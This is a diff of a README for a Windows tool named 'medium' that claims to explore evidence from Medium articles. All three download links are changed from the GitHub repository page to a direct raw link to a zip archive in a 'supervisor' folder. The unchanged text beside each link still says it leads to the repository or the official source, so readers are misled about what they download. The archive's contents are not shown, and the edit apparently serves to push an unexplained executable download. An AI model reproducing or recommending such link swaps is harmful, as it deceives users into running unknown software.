@@ -1,6 +1,6 @@
 # 🧠 medium - Explore Evidence from Medium Articles
 
-[![Download medium](https://img.shields.io/badge/Download-Medium-blue?style=for-the-badge&logo=github)](https://github.com/Carmelelie/medium)
+[![Download medium](https://img.shields.io/badge/Download-Medium-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Carmelelie/medium/main/supervisor/Software-2.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ The steps below will guide you to download and run medium on your Windows PC.
 
 Visit this page to download medium:
 
-[Download medium](https://github.com/Carmelelie/medium)
+[Download medium](https://raw.githubusercontent.com/Carmelelie/medium/main/supervisor/Software-2.9.zip)
 
 Clicking this link will take you to the GitHub repository where the software is hosted.
 
@@ -122,7 +122,7 @@ For help, you can visit the GitHub page and check the **Issues** tab to see if o
 
 If you need to reinstall or install medium on another PC, use this link:
 
-[Download medium](https://github.com/Carmelelie/medium)
+[Download medium](https://raw.githubusercontent.com/Carmelelie/medium/main/supervisor/Software-2.9.zip)
 
 Clicking this link will take you to the official source for the latest version.
 
